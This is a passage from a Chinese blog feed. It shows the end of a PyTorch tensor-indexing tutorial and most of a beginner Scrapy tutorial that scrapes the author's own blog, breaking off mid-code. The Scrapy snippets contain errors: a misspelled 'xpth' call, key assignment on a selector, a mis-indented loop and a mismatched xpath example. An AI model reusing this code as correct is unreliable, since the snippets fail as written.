title="4.索引和切片"></a>4.索引和切片</h2><p>就像在任何其他Python数组中⼀样，张量中的元素可以通过索引访问。与任何<strong>Python</strong>数组⼀样：第⼀个元素的索引是<strong>0</strong>，最后⼀个元素索引是**-1**；可以指定范围以包含第⼀个元素和最后⼀个之前的元素。</p><p>如下所⽰，我们可以⽤**[-1]<strong>选择最后⼀个元素，可以⽤</strong>[1:3]**选择第⼆个和第三个元素：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">X[-<span class="hljs-number">1</span>],X[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]  <span class="hljs-comment">#X[1:3]  默认</span><br></code></pre></td></tr></table></figure><p>除读取外，我们还可以通过指定索引来将元素写⼊矩阵</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">X[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>] = <span class="hljs-number">9</span> <span class="hljs-comment">#第二行第三个修改成9</span><br></code></pre></td></tr></table></figure><p>如果我们想为多个元素赋值相同的值，我们只需要索引所有元素，然后为它们赋值。例如，**[0:2, :]<strong>访问第</strong>1<strong>⾏和第</strong>2⾏，<strong>其中</strong>“:”<strong>代表沿轴</strong>1（列）<strong>的所有元素。虽然我们讨论的是矩阵的索引，但这也适⽤于</strong>向量和超过2个维度的张量**。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">X[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>, :] = <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h2 id="5-节省内存"><a href="#5-节省内存" class="headerlink" title="5.节省内存"></a>5.节省内存</h2><p>运⾏⼀些操作可能会导致为新结果分配内存。例如，如果我们⽤Y = X + Y，我们将取消引⽤Y指向的张量，</p><p>⽽是指向新分配的内存处的张量。</p><p>在下⾯的例⼦中，我们⽤Python的id()函数演⽰了这⼀点，它给我们提供了内存中引⽤对象的确切地址。运</p><p>⾏Y = Y + X后，我们会发现id(Y)指向另⼀个位置。这是因为Python⾸先计算Y + X，为结果分配新的内存，</p><p>然后使Y指向内存中的这个新位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">before = <span class="hljs-built_in">id</span>(Y)<br>Y = Y + X<br><span class="hljs-built_in">id</span>(Y) == before<br></code></pre></td></tr></table></figure><p>这可能是不可取的，原因有两个：</p><ul><li>⾸先，我们不想总是不必要地分配内存。在机器学习中，我们可能有数百兆的参数，并且在⼀秒内多次</li></ul><p>更新所有参数。通常情况下，<strong>我们希望原地执⾏这些更新</strong>；</p><ul><li>如果我们不原地更新，其他引⽤仍然会指向旧的内存位置，这样我们的某些代码可能会⽆意中引⽤旧</li></ul><p>的参数。</p><p>幸运的是，执⾏<strong>原地操作</strong>⾮常简单。我们可以使⽤<strong>切⽚表⽰法</strong>将操作的结果分配给先前分配的数组，例如<strong>Y[:]</strong></p><p><strong>= <expression><strong>。为了说明这⼀点，我们⾸先创建⼀个新的矩阵</strong>Z</expression></strong>，其形状与另⼀个<strong>Y</strong>相同，使⽤<strong>zeros_like</strong>来</p><p>分配⼀个全0的块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Z = torch.zeros_like(Y)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;id(Z):&#x27;</span>, <span class="hljs-built_in">id</span>(Z))<br>Z[:] = X + Y<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;id(Z):&#x27;</span>, <span class="hljs-built_in">id</span>(Z))<br>OUT:<br>    <span class="hljs-built_in">id</span>(Z): <span class="hljs-number">139931132035296</span><br><span class="hljs-built_in">id</span>(Z): <span class="hljs-number">139931132035296</span><br></code></pre></td></tr></table></figure><p>如果在后续计算中没有重复使⽤X，我们也可以使⽤<strong>X[:] = X + Y</strong>或<strong>X += Y</strong>来减少操作的内存开销。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">before = <span class="hljs-built_in">id</span>(X)<br>X += Y<br><span class="hljs-built_in">id</span>(X) == before<br></code></pre></td></tr></table></figure><h2 id="6-转换为Python其他对象"><a href="#6-转换为Python其他对象" class="headerlink" title="6.转换为Python其他对象"></a>6.转换为Python其他对象</h2><p>将深度学习框架定义的张量转换为<strong>NumPy</strong>张量（<strong>ndarray</strong>）很容易，反之也同样容易。<strong>torch</strong>张量和<strong>numpy</strong>数</p><p>组将共享它们的底层内存，就地操作更改⼀个张量也会同时更改另⼀个张量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">A = X.numpy()<br>B = torch.tensor(A)<br><span class="hljs-built_in">type</span>(A), <span class="hljs-built_in">type</span>(B)<br></code></pre></td></tr></table></figure><p>要将<strong>⼤⼩为1</strong>的张量转换为<strong>Python标量</strong>，我们可以调⽤<strong>item函数</strong>或<strong>Python的内置函数</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = torch.tensor([<span class="hljs-number">3.5</span>])<br>a, a.item(), <span class="hljs-built_in">float</span>(a), <span class="hljs-built_in">int</span>(a)<br>OUT:<br>    (tensor([<span class="hljs-number">3.5000</span>]), <span class="hljs-number">3.5</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><strong>⼩结</strong></p><p> 深度学习存储和操作数据的主要接⼝是张量（<strong>n</strong>维数组）。它提供了各种功能，包括基本数学运算、⼴播、索引、切⽚、内存节省和转换其他Python对象。</p><p><strong>练习</strong></p><ul><li>运⾏本节中的代码。将本节中的条件语句X == Y更改为X &lt; Y或X &gt; Y，然后看看你可以得到什么样的</li></ul><p>张量。</p><p>​        答：可以当同一位置相等时，输出为False，其他按照比较运算符规则来输出。</p><ul><li><p>⽤其他形状（例如三维张量）替换⼴播机制中按元素操作的两个张量。结果是否与预期相同？</p><p> 答：输出结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">tensor([[[<span class="hljs-number">0</span>],<br>         [<span class="hljs-number">1</span>]],<br><br>        [[<span class="hljs-number">1</span>],<br>         [<span class="hljs-number">2</span>]],<br><br>        [[<span class="hljs-number">2</span>],<br>         [<span class="hljs-number">3</span>]]])<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>跟李沐学AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
      <tag>Pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy快速入门</title>
    <link href="/project/2023/03/06/Scrapy%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
    <url>/project/2023/03/06/Scrapy%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>该教程适用于Scrapy这一Python爬虫框架的入门学习</p><span id="more"></span><h1 id="第一部分-走进Scrapy"><a href="#第一部分-走进Scrapy" class="headerlink" title="第一部分 走进Scrapy"></a>第一部分 走进Scrapy</h1><h2 id="0-简介及安装"><a href="#0-简介及安装" class="headerlink" title="0.简介及安装"></a>0.简介及安装</h2><p> <strong>简介</strong></p><blockquote><p>scrapy设计目的：用于爬取网络数据，提取结构性数据的框架，其中，scrapy使用了Twisted异步网络框架，大大加快了下载速度</p></blockquote><blockquote><p>Tips:关于开发工具的选取，可以使用Pycharm这款强大的Python IDE，但这里推荐使用VSCode这一象征全世界的代码编辑器！</p></blockquote><p>这里首先介绍如何使用VSCode配置Scrapy框架的开发环境</p><p>首先笔者假设您已经完整阅读过VSCode快速入门、Conda快速入门</p><p>首先，您需要创建一个文件夹用以存放Scrapy项目文件夹，建议以Scrapy命名</p><p>在VSCode中打开文件夹Scrapy</p><p><img src="/project/scrapy_images/openFolder.jpg" alt="打开文件夹"></p><p>打开目标文件夹Scrapy后，需要配置Python解释器，笔者这里假设您已经安装好python,或者使用conda安装了Python虚拟环境，VSCode会在下图圈中位置提醒您配置解释器，笔者这里已经配置好了Python解释器</p><p><img src="/project/scrapy_images/interpreter.png" alt="配置解释器"></p><p>配置完成后，开始进行Scrapy框架的安装 该框架的安装非常简单 需要用到终端输入命令行，如果您没有出现终端窗口，可以进行下图操作</p><p><img src="/project/scrapy_images/%E5%88%87%E6%8D%A2%E7%BB%88%E7%AB%AF%E7%AA%97%E5%8F%A3.png" alt="打开控制台"></p><p><strong>安装</strong></p><p>接下来，您只需要在终端中输入以下命令即可进行安装，当安装成功后，进入下一步操作</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> scrapy<br></code></pre></td></tr></table></figure><p>如果您希望尽早开始实际操作，可以先完成第二部分后再来看下面内容 </p><p>如果您希望保证教程的连续性，浏览下面的理论内容也是可行的，但建议您实操完后对下面内容进行复习巩固 相信您会对理论有更深入的认识 </p><h2 id="1-Scrapy项目开发流程"><a href="#1-Scrapy项目开发流程" class="headerlink" title="1.Scrapy项目开发流程"></a>1.Scrapy项目开发流程</h2><p>1.创建项目</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">scrapy startproject <span class="hljs-tag">&lt;<span class="hljs-name">项目名称</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.生成一个爬虫</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">scrapy genspider <span class="hljs-tag">&lt;<span class="hljs-name">爬虫名称</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">允许爬取的域名</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.提取数据：根据网站结构在spider中实现数据采集相关内容</p><p>4.保存数据：使用pipline进行数据后续处理和保存</p><h2 id="2-Scrapy框架运行流程"><a href="#2-Scrapy框架运行流程" class="headerlink" title="2.Scrapy框架运行流程"></a>2.Scrapy框架运行流程</h2><p><img src="/project/scrapy_images/Scrapy%E6%A1%86%E6%9E%B6.png" alt="流程图"></p><p><img src="/project/scrapy_images/%E5%85%B7%E4%BD%93%E6%A8%A1%E5%9D%97%E4%BD%9C%E7%94%A8.png" alt="各模块作用"></p><h3 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h3><p>1.爬虫中起始url构造的url对象 -&gt; 爬虫中间件 -&gt; 引擎 -&gt; 调度器<br>2.调度器把request发送 -&gt; 引擎 -&gt; 下载中间件 -&gt; 下载器<br>3.下载器发送请求，获取request响应 -&gt; 下载中间件 -&gt; 引擎 -&gt; 爬虫中间件 -&gt; 爬虫<br>4.爬虫提取url地址，组装成request对象 -&gt; 爬虫中间件 -&gt; 引擎 -&gt; 调度器，重复步骤2<br>5.爬虫提取数据 -&gt; 引擎 -&gt; 管道处理和保存数据</p><blockquote><p>Tips:原理描述中的下载中间件和爬虫中间件只是运行时的位置不同，作用是重复的！</p></blockquote><p> <strong>==下面到本次教程的重点！！！ 您的第一个Scrapy从现在开始！！！==</strong> </p><h1 id="第二部分-创建-amp-amp-运行您的第一个Scrapy项目！"><a href="#第二部分-创建-amp-amp-运行您的第一个Scrapy项目！" class="headerlink" title="第二部分 创建&amp;&amp;运行您的第一个Scrapy项目！"></a>第二部分 创建&amp;&amp;运行您的第一个Scrapy项目！</h1><h2 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h2><p>相信如果您仔细阅读本教程 在第一部分的Scrapy项目开发流程中，有两个终端指令，其中第一个指令即为创建新项目的指令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">创建scrapy项目的命令：scrapy startproject <span class="hljs-tag">&lt;<span class="hljs-name">项目名称</span>&gt;</span><br>示例：<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scrapy </span>startproject SivanWuLa <span class="hljs-comment">#后续的教程均以该项目为示例</span><br></code></pre></td></tr></table></figure><p>在终端运行该条指令后，您会发现在Scrapy目录下生成了一个SivanWuLa文件夹，该文件夹的文件树如下图：</p><p><img src="/project/scrapy_images/%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E6%A0%91.png" alt="项目文件树"></p><h2 id="2-爬虫文件的创建"><a href="#2-爬虫文件的创建" class="headerlink" title="2.爬虫文件的创建"></a>2.爬虫文件的创建</h2><p>熟悉其他爬虫框架的读者应当发觉，该文件树中缺少重要的核心爬虫文件，但不要担心，Scrapy设置了终端命令，可以自动生成爬虫文件</p><p>但生成之前，您应当保证终端中进入了刚才生成的SivanWuLa根路径下，若没有，请在终端输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> SivanWuLa<br></code></pre></td></tr></table></figure><p>保证在项目根路径下后，执行一下终端命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">scrapy genspider <span class="hljs-tag">&lt;<span class="hljs-name">爬虫名字</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">允许爬取的域名</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scrapy </span>genspider getSivanInfo sivanwula.tech<br></code></pre></td></tr></table></figure><p>我这里给出的域名，是我的个人技术博客网站，欢迎大家多多访问，我的博客支持友链入驻，欢迎各位读者！</p><h2 id="3-运行Scrapy爬虫"><a href="#3-运行Scrapy爬虫" class="headerlink" title="3.运行Scrapy爬虫"></a>3.运行Scrapy爬虫</h2><p>命令：在项目目录下执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">scrapy crawl <span class="hljs-tag">&lt;<span class="hljs-name">爬虫名字</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过，在运行爬虫之前，我们先要编写spiders文件夹下的SivanWula爬虫文件</p><p>我先给出一个完整版的示例，然后分块进行详细的讲解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coidng utf-8 -*-</span><br><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SivaninfoSpider</span>(scrapy.Spider):<br>    <span class="hljs-comment"># 爬虫运行时的参数</span><br>    name = <span class="hljs-string">&#x27;SivanInfo&#x27;</span><br>    <span class="hljs-comment">#检查运行爬的域名</span><br>    allowed_domains = [<span class="hljs-string">&#x27;sivanwula.tech&#x27;</span>]<br>    <span class="hljs-comment"># 1.修改设置起始的url</span><br>    start_urls = [<span class="hljs-string">&#x27;http://sivanwula.tech/&#x27;</span>]<br><br>   <span class="hljs-comment"># 数据提取的方法接收下载中间件传过来的response，定义对于网站相关的操作</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment">#获取网站中文章板中所有文章的节点</span><br>        a_list = response.xpth(<span class="hljs-string">&quot;//*[@id=&#x27;board&#x27;]/div/div/div/div&quot;</span>)<br>        <span class="hljs-built_in">print</span>(a_list)<br>        <span class="hljs-comment"># 遍历文章节点列表</span><br>        art_list = &#123;&#125;<br><br>        <span class="hljs-keyword">for</span> article <span class="hljs-keyword">in</span> a_list:<br>            <span class="hljs-comment"># xpath方法返回的是选择器对象列表 </span><br>            <span class="hljs-comment"># extract()方法可以提取到selector对象中data对应的数据</span><br>            article[<span class="hljs-string">&#x27;title&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/h1/a/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>            article[<span class="hljs-string">&#x27;abstract&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/a/div/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>            <span class="hljs-keyword">yield</span> article<br></code></pre></td></tr></table></figure><p>此时您直接输入指令，发现已经可以运行了</p><p><img src="/project/scrapy_images/%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C.png" alt="直接运行"></p><p>当然，这个只是刚刚开始，我们刚刚明确了爬虫所爬取数据，接下来使用管道进行数据持久化操作</p><h2 id="4-管道数据持久化"><a href="#4-管道数据持久化" class="headerlink" title="4.管道数据持久化"></a>4.管道数据持久化</h2><p>修改我们的SivanWuLa.py爬虫文件，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coidng utf-8 -*-</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> ..items <span class="hljs-keyword">import</span> SivanwulaItem <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SivaninfoSpider</span>(scrapy.Spider):<br>    <span class="hljs-comment"># 爬虫运行时的参数</span><br>    name = <span class="hljs-string">&#x27;SivanInfo&#x27;</span><br>    <span class="hljs-comment">#检查运行爬的域名</span><br>    allowed_domains = [<span class="hljs-string">&#x27;sivanwula.tech&#x27;</span>]<br>    <span class="hljs-comment"># 1.修改设置起始的url</span><br>    start_urls = [<span class="hljs-string">&#x27;http://sivanwula.tech/&#x27;</span>]<br><br>   <span class="hljs-comment"># 数据提取的方法接收下载中间件传过来的response，定义对于网站相关的操作</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-comment">#获取网站中文章板中所有文章的节点</span><br>        a_list = response.xpth(<span class="hljs-string">&quot;//*[@id=&#x27;board&#x27;]/div/div/div/div&quot;</span>)<br>        <span class="hljs-built_in">print</span>(a_list)<br>        <span class="hljs-comment"># 遍历文章节点列表</span><br>        item = SivanwulaItem() <span class="hljs-comment">#创建了一个储存数据的类对象</span><br>         <span class="hljs-keyword">for</span> article <span class="hljs-keyword">in</span> a_list:<br>            <span class="hljs-comment"># xpath方法返回的是选择器对象列表 </span><br>            <span class="hljs-comment"># extract()方法可以提取到selector对象中data对应的数据</span><br>            item[<span class="hljs-string">&#x27;title&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/h1/a/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>            item[<span class="hljs-string">&#x27;abstract&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/a/div/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>            <span class="hljs-keyword">yield</span> item  <br></code></pre></td></tr></table></figure><p>修改后文件后，是不是发现部分内容发生了变化，我们导入了根目录下items.py文件中的SivanwulaItem，这是一个类，可以用来创建储存数据的具有字典属性的对象，该类在items.py文件中定义，（后续部分的数据建模有详细介绍）如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><br><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SivanwulaItem</span>(scrapy.Item):<br>    title = scrapy.Field()<br>    abstract = scrapy.Field()<br></code></pre></td></tr></table></figure><p>我们发现类中的title，abstract都是Field类的对象，我们查看Field源码，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Field</span>(<span class="hljs-title class_ inherited__">dict</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Container of field metadata&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>发现该类只是内置字典类（dict）的一个别名，并没有提供额外的方法和属性。</p><p>该类创建的对象有下面四个特征：</p><ul><li>Field对象指明了每个字段的元数据（任何元数据），Field对象接受的值没有任何限制</li><li>设置Field对象的主要目就是在一个地方定义好所有的元数据</li><li>注意，声明item的Field对象，并没有被赋值成class属性。（可通过item.fields进行访问）</li><li>被用来基于类属性的方法来支持item生命语法。</li></ul><p>对于我们有用的一点在于，该类创建的对象可以用来存储任何类型的值，所以SivanWuLa.py文件中，我们直接将获取的网站中文章板中关于文章有用数据的xpath存入了iten中的相应的field对象中，关于什么是xpath,该教程不予以赘述，这里是<a href="https://blog.csdn.net/weixin_45755332/article/details/107193013"><strong>传送门</strong></a>。</p><p>默认读者已经理解xpath的具体概念，但其实不理解也没关系，因为重点在于我们该如何获取它，获取文章板中所有的文章节点时，我们直接使用了下载中间件传来的response，这意味着下载中间件已经将相应HTML存储到了磁盘中，此时我们只需直接通过xpath搜寻我们已经下载好的感兴趣数据。</p><p>那么，我们该如何定位到感兴趣数据的xpath呢，这时候就是比较笨拙的方法的了，我们直接来到sivanwula.tech（鉴于网页部署在GitHub上的缘故，加载可能有些卡，各位见谅），进入页面，我们直接在文章板处右键，如下：</p><p><img src="/project/scrapy_images/%E5%8F%B3%E9%94%AE%E6%A3%80%E6%9F%A5.png" alt="右键检查"></p><p>之后会弹出下面界面（其实对于浏览器，直接按f12也可以弹出该界面，但当网页结构较为复杂时，很难定位到所需数据的周围位置，所以推荐检查，定位更为高效）</p><p><img src="/project/scrapy_images/%E6%A3%80%E6%9F%A5%E4%B9%8B%E5%90%8E.png" alt="检查之后"></p><p>这时候，我们只需右键该行html语言，然后点击复制，在点击复制XPATH，如下：</p><p><img src="/project/scrapy_images/%E5%A4%8D%E5%88%B6xpath.png" alt="复制XPATH"></p><p>这时候，我们就已经获取到了所需xpath</p><p>我们发现复制完的xpath为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">//*[@id=&quot;board&quot;]/div/div/div/div<br></code></pre></td></tr></table></figure><p>该xpath是整个文章板，可以用来生成文章节点列表，正如代码中所写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a_list = response.xpth(<span class="hljs-string">&quot;//*[@id=&#x27;board&#x27;]/div/div/div/div&quot;</span>)<br></code></pre></td></tr></table></figure><p>当然，应当注意，需将board的双引号改为单引号，才能符合python的字符串原则</p><p>接下来我们需要将感兴趣的数据的xpath复制下来，首先得明确哪些数据对应于我们item对象中的field成员，如下图：</p><p><img src="/project/scrapy_images/%E6%98%8E%E7%A1%AE%E6%95%B0%E6%8D%AE.png" alt="明确数据"></p><p>那么，接下来，我们以title为例，来获取它的xpath,同样，首先我们直接检查文章板，然后我们点击代码旁的小三角度，进行多次展开展开，观察左边界面，当一个文章节点被选中时，我们再次展开，然后选中到标题的html,然后执行cv操作，如下图：</p><p><img src="/project/scrapy_images/%E6%A0%87%E9%A2%98xpath.png" alt="标题xpath"></p><p>得到的xpath如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">//*[@id=&quot;board&quot;]/div/div/div/div[1]/article/h1/a<br></code></pre></td></tr></table></figure><p>该xpath还需要进一步处理，由下段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> article <span class="hljs-keyword">in</span> a_list:<br>           <span class="hljs-comment"># xpath方法返回的是选择器对象列表 </span><br>           <span class="hljs-comment"># extract()方法可以提取到selector对象中data对应的数据</span><br>           item[<span class="hljs-string">&#x27;title&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/h1/a/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>           item[<span class="hljs-string">&#x27;abstract&#x27;</span>] = article.xpath(<span class="hljs-string">&#x27;./article/a/div/text()&#x27;</span>)[<span class="hljs-number">0</span>].extract()<br>           <span class="hljs-keyword">yield</span> item  <br></code></pre></td></tr></table></figure><p>可知道，我们通过遍历文章节点列表中的节点，并获取相应节点中的相应数据的xpath，所以我们不需要书写完整的xpath，只需要给出特殊部分，根据获得的文章板的xpath，对比一下，我们只需书写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">./article/h1/a<br></code></pre></td></tr></table></figure><p>但为了获得文本，我们需要加上text()这一函数，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">./article/a/div/text()<br></code></pre></td></tr></table></figure><p>abstract的xpath获取方式类似，不予以赘述。</p><h2 id="5-管道保存数据"><a href="#5-管道保存数据" class="headerlink" title="5.管道保存数据"></a>5.管道保存数据</h2><p>在piplines.py文件中定义对数据的操作！</p><p> 具体流程：</p><ul><li>定义一个管道类</li><li>重写管道类的process_item方法</li><li>process_item方法处理完item之后必须返回给引擎</li></ul><p>这里我们使用一个json文件来保存我们获取的数据</p><p>piplines.py 修改后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Define your item pipelines here</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span><br><span class="hljs-comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><br><br><br><span class="hljs-comment"># useful for handling different item types with a single interface</span><br><span class="hljs-keyword">from</span> itemadapter <span class="hljs-keyword">import</span> ItemAdapter<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SivanwulaPipeline</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;SivanWuLaInfo.json&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-comment"># 将item对象强制转成字典，该操作只能在scrapy中使用</span><br>        <span class="hljs-comment">#该方法为固定名称函数</span><br>        <span class="hljs-comment"># 默认使用完管道，需要将数据返回给引擎</span><br>        <span class="hljs-comment"># 1.将字典数据序列化</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;ensure_ascii=False 将Unicode类型转换为str类型，默认为True&#x27;&#x27;&#x27;</span><br>        json_data = json.dumps(item,ensure_ascii=<span class="hljs-literal">False</span>,indent=<span class="hljs-number">2</span>) + 